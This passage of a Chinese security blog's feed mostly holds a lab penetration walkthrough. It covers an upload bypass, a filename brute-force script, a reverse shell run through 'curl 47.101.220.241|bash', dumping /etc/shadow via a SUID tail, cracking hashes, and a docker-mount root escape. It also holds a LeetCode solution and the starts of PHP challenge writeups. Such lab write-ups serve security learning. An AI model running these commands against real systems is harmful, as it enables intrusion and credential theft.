title="源码泄露"></a>源码泄露</h3><p>扫目录发现有 <code>/upload.php</code> ，查看源码可得 GitHub 链接。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1zlqwx1alj20eq01xjrb.jpg" alt></p><p>来一波代码审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">    <span class="comment">// 直接爆破</span></span><br><span class="line">$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// shell.php/.</span></span><br><span class="line">$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="comment">// 只验证了文件名</span></span><br><span class="line">$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$uploadOk = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://0x1.im/blog/php/php-function-getimagesize.html" target="_blank" rel="noopener">getimagesize 函数不是完全可靠的</a></p><p>修改成功。可按上面链接的方法改，也可直接在 post 内容里加上 <code>GIF98</code> 之类的头信息。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xol2qxk6j20cw05874g.jpg" alt></p><p>再写一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">"http://192.168.0.106:8000/uploads/"</span></span><br><span class="line">    key = <span class="string">'2.php'</span> + str(i)</span><br><span class="line">    m5 = hashlib.md5(key.encode()).hexdigest()</span><br><span class="line">    url += m5 + <span class="string">'.php'</span></span><br><span class="line">    re = requests.get(url)</span><br><span class="line">    print(re.status_code)</span><br><span class="line">    <span class="keyword">if</span> re.status_code == <span class="number">200</span>:</span><br><span class="line">        print(url, <span class="number">23333333333333333333333333333333333333333333333333</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>或者按这种 <code>fuzz</code> 的办法，也可以用 <code>Burp</code> 中的 <code>instruder</code> ，不再赘述。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w test.txt --hc 404 http://localhost:8000/uploads/FUZZ.php</span><br></pre></td></tr></table></figure><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>直接弹 shell，成功。也可以执行 <code>nc</code> 命令把 bash 反弹出来。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.106</span>:<span class="number">8000</span><span class="regexp">/uploads/</span><span class="number">9</span>e2b0f7dd8852a2987e7ade6fb2e948f.php</span><br><span class="line">?<span class="number">1</span>=system(<span class="string">"curl 47.101.220.241|bash"</span>);</span><br></pre></td></tr></table></figure><h3 id="开始提权"><a href="#开始提权" class="headerlink" title="开始提权"></a>开始提权</h3><p>获取到低权限SHELL后我们通常做下面几件事</p><ul><li><p>检测操作系统的发行版本</p></li><li><p>查看内核版本</p></li><li><p>检测当前用户权限</p></li><li><p>列举 suid 文件</p></li><li><p>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看内核信息</span></span><br><span class="line">uname -a</span><br><span class="line">Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较新，有相应的 cve 可以提权，然而要等一个多小时</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看以 root 运行的服务</span></span><br><span class="line">www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root</span><br><span class="line">root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND</span><br><span class="line">root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh</span><br><span class="line">root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300</span><br><span class="line">www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 哈哈，还有个定时删除的任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">    rm -rf /var/www/html/uploads/*.php</span><br><span class="line">    sleep 300</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> suid</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/tail</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 能拿到 root 的哈希</span></span><br><span class="line">tail -n 100 /etc/shadow</span><br><span class="line">root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把这个存为 <span class="built_in">hash</span></span></span><br><span class="line">john hash</span><br><span class="line">john --show</span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到密码：john</span></span><br></pre></td></tr></table></figure><p>无法直接在 <code>nc</code> 里切到 root，拿到密码之后连接 <code>ssh</code> 试试，密码错误，必须模拟一下终端设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure><p>先看下 <code>flag</code> ，还是不行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">Life consists of details..</span><br></pre></td></tr></table></figure><p>那我们再找找，<code>/root</code> 目录下还有个东西。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .port</span><br><span class="line">Listen to your friends..</span><br><span class="line">7*</span><br></pre></td></tr></table></figure><h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>找了下 7 开头的端口，发现没这玩意。不过我们遗漏了 MySQL，去看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'wordpress');</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'wordpress');</span><br><span class="line">/* MySQL hostname */</span><br><span class="line">define('DB_HOST', 'db:3306');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 直接进入失败了</span></span><br><span class="line">mysql -u wordpress -p wordpress</span><br><span class="line">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 先拿到 ip</span></span><br><span class="line">ping db -c 3</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms</span><br><span class="line"><span class="meta">#</span><span class="bash"> 还有一招</span></span><br><span class="line">arp -an</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程连接试试</span></span><br><span class="line">mysql -h 172.18.0.2 -u wordpress -p wordpress</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [wordpress]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| host_ssh_cred         |</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br><span class="line">select * from host_ssh_cred;</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| id                | pw                               |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="拿到权限"><a href="#拿到权限" class="headerlink" title="拿到权限"></a>拿到权限</h3><p>解密可得 <code>123456</code>，此时再试试 <code>ssh</code> 连接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hummingbirdscyber@vulnvm:~$ id</span><br><span class="line">uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure><p>发现 docker 的身影</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">hummingbirdscyber@vulnvm:~$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">252fa8cb1646        ubuntu              "/bin/bash"              6 weeks ago         Up 5 minutes                               brave_edison</span><br><span class="line">1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        0.0.0.0:8000-&gt;80/tcp   experimental_wordpress_1</span><br><span class="line">81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        3306/tcp, 33060/tcp    experimental_db_1</span><br></pre></td></tr></table></figure><p>进了几个容器看了下，找不到 <code>flag</code>，卡住了。</p><blockquote><p>We find that the Ubuntu image is available to us, so we use this to create a new docker container and mount the / directory of the host inside a folder called /root. After we run the docker image we go to /root/root and find a file called “flag”. When we open the file, we find our congratulatory flag.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/root -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>找了下 wp，有些大佬是这样玩的，为啥一定要加 <code>/:/root</code> ？</p><p>拿到权限就行，以后再补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;实战好玩，紧张刺激，但很难能针对性地练习某一种知识，更像是一种综合性的考试。&lt;/p&gt;
&lt;p&gt;其次，大牛都说，渗透测试的本质就是信息收集，信息
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://wywwzjj.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode 322.Coin Change[DP]</title>
    <link href="https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/"/>
    <id>https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/</id>
    <published>2019-04-04T01:07:35.000Z</published>
    <updated>2019-04-04T01:57:42.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code>。</p><p><strong>示例 1:</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: coins = [1, 2, 5], amount = 11</span><br><span class="line">输出:<span class="number"> 3 </span></span><br><span class="line">解释:<span class="number"> 11 </span>=<span class="number"> 5 </span>+<span class="number"> 5 </span>+ 1</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: coins = [2], amount = 3</span></span><br><span class="line"><span class="section">输出: -1</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考虑状态方程，需描述出组合成总金额所花最少的硬币个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dp[i][j] 表示使用前 i 种硬币表示总额 j 所用的最少硬币数</span></span><br><span class="line"><span class="comment"># 初始状态 dp[-1][j] = ∞  dp[i][0] = 0</span></span><br><span class="line">dp[i][j] = min(dp[i][j], dp[i<span class="number">-1</span>][j-coin_i*k] + k)</span><br><span class="line"> = min(dp[i][j], dp[i][j-coin_i] + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 观察发现都具有 dp[i]，进一步压缩，使用滚动数组</span></span><br><span class="line">dp[j] = min(dp[j], dp[j-coin_i] + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>以*<em>示例 1 *</em>为例</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1qceh5ejjj20qb035gll.jpg" alt></p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><strong>DP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行用时：1672 ms，击败了 39.85% 的用户</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins: List[int], amount: int)</span> -&gt; int:</span></span><br><span class="line">    dp = [amount+<span class="number">1</span>] * (amount + <span class="number">5</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>):</span><br><span class="line">            dp[i] = min(dp[i], dp[i-coin] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[amount] &gt;= amount + <span class="number">1</span> <span class="keyword">else</span> dp[amount]</span><br></pre></td></tr></table></figure><p><strong>DFS + greedy + pruning</strong></p><p>待补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字 webshell</title>
    <link href="https://wywwzjj.top/2019/04/02/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-webshell/"/>
    <id>https://wywwzjj.top/2019/04/02/无字母数字-webshell/</id>
    <published>2019-04-02T15:19:52.000Z</published>
    <updated>2019-04-04T01:55:40.421Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="webshell" scheme="https://wywwzjj.top/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>PHP SECURITY CALENDAR Writeup</title>
    <link href="https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/"/>
    <id>https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/</id>
    <published>2019-03-02T04:10:12.000Z</published>
    <updated>2019-07-12T10:24:20.998Z</updated>
    
    <content type="html"><![CDATA[<p>有意思一点的优先做了，有时间再更新。</p><h2 id="1-Wish-List"><a href="#1-Wish-List" class="headerlink" title="1 - Wish List"></a>1 - Wish List</h2><blockquote><p>in_array</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file ( string $filename , string $destination ) : bool</span><br></pre></td></tr></table></figure><p>这是文件上传中常用的一个函数，文件被上传结束后，默认地被存储在了临时目录中，这时必须将它从临时目录中移动到其它地方，因为脚本执行完后，临时目录里的文件会被删除。所以要在删除之前用 PHP 的 <code>copy()</code> 或者 <code>move_upload_file()</code>  函数将它复制或者移动到其它位置，到此，才算完成了上传文件过程。</p><p>再观察里面的两个参数，如果 <code>file[&#39;name&#39;]</code> 是可控的话，可通过 <code>../</code> 进行目录穿越。</p><p>回溯一下，在构造函数中可看到，<code>this-&gt;file</code> 来自  <code>$_FILES[&#39;solution&#39;]</code> 。</p><p>此处的 <code>$_FILES</code> 是 PHP 中的超级全局变量，该数组包含有所有上传的文件信息，这里可本地做做实验。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>构造如下表单</strong>（嫌麻烦可以直接 Burp 提交）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/test.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"solution"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 